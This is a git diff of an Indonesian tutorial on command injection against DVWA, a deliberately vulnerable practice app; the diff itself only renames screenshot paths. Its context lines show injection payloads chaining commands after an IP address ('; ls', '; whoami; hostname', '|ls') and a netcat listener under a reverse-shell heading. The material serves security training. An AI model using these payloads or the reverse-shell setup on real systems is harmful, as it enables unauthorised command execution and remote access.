@@ -5,12 +5,12 @@ Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan 
 ```sh
 127.0.0.1; ls
 ``` 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%201.JPG)
 
 ```sh
 127.0.0.1; whoami; hostname
 ```
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%202.JPG)
 
 Menjalankan Reverse Shell di Server
 ```sh
@@ -22,8 +22,7 @@ Listener
 nc -lnvp 9999
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%208.JPG)
-
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%203.JPG)
 
 ## Security Medium
 ```sh
@@ -42,4 +41,4 @@ Di level ini kita hanya bisa mengeksekusi 1 perintah saja
 127.0.0.1|ls
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/command%20injection/command%20injection%204.JPG)
